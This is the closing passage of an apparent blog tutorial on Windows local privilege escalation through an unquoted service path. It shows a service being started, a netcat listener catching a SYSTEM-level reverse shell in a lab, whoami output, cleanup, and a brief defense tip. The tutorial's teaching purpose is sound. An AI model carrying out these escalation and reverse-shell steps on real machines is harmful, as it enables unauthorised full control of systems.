<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">net</span> <span class="nb">start </span><span class="s2">&#34;Unquoted VulnService&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We have received a reverse shell running as <code>NT AUTHORITY\SYSTEM</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ nc -lvnp <span class="m">443</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.27.128<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.27.129<span class="o">]</span> <span class="m">50714</span>
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.22000.493<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami /all
</span></span><span class="line"><span class="cl">whoami /all
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">USER INFORMATION
</span></span><span class="line"><span class="cl">----------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User Name           <span class="nv">SID</span>
</span></span><span class="line"><span class="cl"><span class="o">===================</span> <span class="o">========</span>
</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem S-1-5-18
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">GROUP INFORMATION
</span></span><span class="line"><span class="cl">-----------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Group Name                             Type             SID          <span class="nv">Attributes</span>
</span></span><span class="line"><span class="cl"><span class="o">======================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">==================================================</span>
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\A</span>dministrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
</span></span><span class="line"><span class="cl">Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\A</span>uthenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">Mandatory Label<span class="se">\S</span>ystem Mandatory Level Label            S-1-16-16384
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
</span></span><span class="line"><span class="cl">----------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Privilege Name                            Description                                                        <span class="nv">State</span>
</span></span><span class="line"><span class="cl"><span class="o">=========================================</span> <span class="o">==================================================================</span> <span class="o">========</span>
</span></span><span class="line"><span class="cl">SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
</span></span><span class="line"><span class="cl">SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
</span></span><span class="line"><span class="cl">SeIncreaseQuotaPrivilege                  Adjust memory quotas <span class="k">for</span> a process                                 Disabled
</span></span><span class="line"><span class="cl">SeTcbPrivilege                            Act as part of the operating system                                Enabled
</span></span><span class="line"><span class="cl">SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
</span></span><span class="line"><span class="cl">SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
</span></span><span class="line"><span class="cl">SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
</span></span><span class="line"><span class="cl">SeSystemProfilePrivilege                  Profile system performance                                         Enabled
</span></span><span class="line"><span class="cl">SeSystemtimePrivilege                     Change the system <span class="nb">time</span>                                             Disabled
</span></span><span class="line"><span class="cl">SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
</span></span><span class="line"><span class="cl">SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
</span></span><span class="line"><span class="cl">SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
</span></span><span class="line"><span class="cl">SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
</span></span><span class="line"><span class="cl">SeBackupPrivilege                         Back up files and directories                                      Disabled
</span></span><span class="line"><span class="cl">SeRestorePrivilege                        Restore files and directories                                      Disabled
</span></span><span class="line"><span class="cl">SeShutdownPrivilege                       Shut down the system                                               Disabled
</span></span><span class="line"><span class="cl">SeDebugPrivilege                          Debug programs                                                     Enabled
</span></span><span class="line"><span class="cl">SeAuditPrivilege                          Generate security audits                                           Enabled
</span></span><span class="line"><span class="cl">SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
</span></span><span class="line"><span class="cl">SeUndockPrivilege                         Remove computer from docking station                               Disabled
</span></span><span class="line"><span class="cl">SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
</span></span><span class="line"><span class="cl">SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
</span></span><span class="line"><span class="cl">SeCreateGlobalPrivilege                   Create global objects                                              Enabled
</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege             Increase a process working <span class="nb">set</span>                                     Enabled
</span></span><span class="line"><span class="cl">SeTimeZonePrivilege                       Change the <span class="nb">time</span> zone                                               Enabled
</span></span><span class="line"><span class="cl">SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
</span></span><span class="line"><span class="cl">SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token <span class="k">for</span> another user in the same session Enabled
</span></span></code></pre></td></tr></table>
</div>
</div><p>We&rsquo;re gonna delete this service from an <strong>administrator</strong> command prompt:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">delete</span> <span class="s2">&#34;Unquoted VulnService&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">DeleteService</span> <span class="n">SUCCESS</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="defense-3">Defense</h2>
<p>Make sure to add quotes (<code>&quot; &quot;</code>) to the service binary path and verify that the directories are not writable by unprivileged users.</p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2022-03-20</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/services/">Services</a>,&nbsp;<a href="/tags/unquoted-path-service/">Unquoted Path Service</a>,&nbsp;<a href="/tags/insecure-registry-hives/">Insecure Registry Hives</a>,&nbsp;<a href="/tags/insecure-service-executable/">Insecure Service Executable</a>,&nbsp;<a href="/tags/insecure-service-permissions/">Insecure Service Permissions</a>,&nbsp;<a href="/tags/local-privilege-escalation/">Local Privilege Escalation</a>,&nbsp;<a href="/tags/windows/">Windows</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/windows-privesc-apps/" class="prev" rel="prev" title="Windows Local Privilege Escalation - Applications for CTF Creators"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Windows Local Privilege Escalation - Applications for CTF Creators</a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.138.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":-1},"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
